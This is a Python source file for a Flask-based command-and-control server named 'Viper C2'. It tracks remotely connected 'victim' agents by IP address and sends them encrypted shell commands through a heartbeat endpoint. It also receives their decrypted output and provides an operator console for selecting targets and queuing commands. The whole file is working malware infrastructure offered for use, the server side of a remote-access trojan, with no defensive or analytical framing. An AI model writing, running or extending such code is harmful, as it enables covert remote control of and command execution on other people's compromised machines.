import logging
from flask import Flask, request, jsonify
import threading
import time
import viper_crypto
import os
import sys

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
agents = {}
commands_queue = {}
CURRENT_TARGET = None

@app.route('/heartbeat', methods=['GET'])
def heartbeat():
    victim_ip = request.remote_addr
    agents[victim_ip] = {
        'last_seen': time.time(),
        'status': 'online'
    }
    command = commands_queue.get(victim_ip)
    if command:
        del commands_queue[victim_ip]
        encrypted_command = viper_crypto.encrypt_data(command)
        return jsonify({"command": encrypted_command})
    else:
        return jsonify({"command": None})
    
@app.route('/result', methods=['POST'])
def result():
    global CURRENT_TARGET
    data = request.json
    victim_ip = request.remote_addr
    encrypted_output = data.get('output')
    if encrypted_output:
        decrypted_output = viper_crypto.decrypt_data(encrypted_output)
        if decrypted_output is None:
            decrypted_output = "[Error: Decryption Failed]"
    else:
        decrypted_output = "No output received."
    print(f"\n[+] Report from {victim_ip} (Decrypted):\n{decrypted_output}")
    if CURRENT_TARGET:
        print(f"Viper-Shell ({CURRENT_TARGET}) > ", end="", flush=True)
    else:
        print("Viper-Shell > ", end="", flush=True)
    return "OK"

def commander():
    global CURRENT_TARGET
    time.sleep(2)
    print("\n" + "="*30 + "\n")
    print("Viper C2 Command and Control Server")
    print("type 'help' for commands")
    print("\n" + "="*30)
    while True:
        if CURRENT_TARGET:
            prompt = f"Viper-Shell ({CURRENT_TARGET}) > "
        else:
            prompt = "Viper-Shell > "
        try:
            cmd = input(prompt).strip()
        except EOFError:
            continue
        if not cmd: continue
        if CURRENT_TARGET is None:
            if cmd == "help":
                print("\n[MAIN COMMANDS]")
                print(" - list               : List connected agents")
                print(" - select <IP>       : Select an agent to interact with")
                print(" - exit              : Shut down the server")
            elif cmd == "list":
                print("\n[Active Agents]")
                print(f"{'IP Address':<20} {'Status':<10} {'Last Seen'}")
                print("\n" + "="*40)
                now = time.time()
                for ip, info in list(agents.items()):
                    seconds_ago = int(now - info['last_seen'])
                    if seconds_ago > 10:
                        status = 'offline'
                    else:
                        status = 'online'
                    print(f"{ip:<20} {status:<10} {seconds_ago} seconds ago")
            elif cmd.startswith("select "):
                target_ip = cmd.split(" ")[1]
                if target_ip in agents:
                    CURRENT_TARGET = target_ip
                    print(f"[*] Target set to {CURRENT_TARGET}")
                else:
                    print("[-] Invalid IP. Use 'list' to see connected agents.")
            elif cmd == "exit":
                print("Shutting down server...")
                os._exit(0)
            else:
                print("[-] Unknown command. Type 'help' for a list of commands.")
        else:
            if cmd == "back":
                CURRENT_TARGET = None
                print("[*] Returned to main command prompt.")
            elif cmd == "help":
                print("\n[SESSION COMMANDS]")
                print(" - back               : Return to main prompt")
                print(" <cmd>                : Send command CMD/Shell to the selected agent")
            else:
                commands_queue[CURRENT_TARGET] = cmd
                print(f"[*] Command queued for {CURRENT_TARGET}")

if __name__ == '__main__':
    t = threading.Thread(target=app.run, kwargs={'port': 5000})
    t.daemon = True
    t.start()
    commander()